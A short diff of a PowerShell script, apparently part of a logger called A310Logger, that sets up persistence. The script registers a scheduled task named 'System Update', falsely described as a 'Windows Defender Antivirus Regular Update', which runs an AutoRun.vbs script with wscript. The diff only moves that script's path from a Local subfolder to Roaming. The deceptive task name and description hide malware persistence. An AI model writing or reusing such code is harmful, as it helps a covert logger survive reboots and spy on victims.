@@ -32,11 +32,11 @@ if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt")) {
 
 
        try { 
-       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR 'wscript.exe ""C:\Users\%username%\AppData\Local\0101\AutoRun.vbs""' /ST 23:55 | Out-Null
+       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR 'wscript.exe ""C:\Users\%username%\AppData\Roaming\AutoRun.vbs""' /ST 23:55 | Out-Null
        }
        catch {
        $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
-       $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\%username%\AppData\Local\0101\AutoRun.vbs"'
+       $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\%username%\AppData\Roaming\AutoRun.vbs"'
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "System Update" -Description "Windows Defender Antivirus Regular Update." -Force
        }
   	
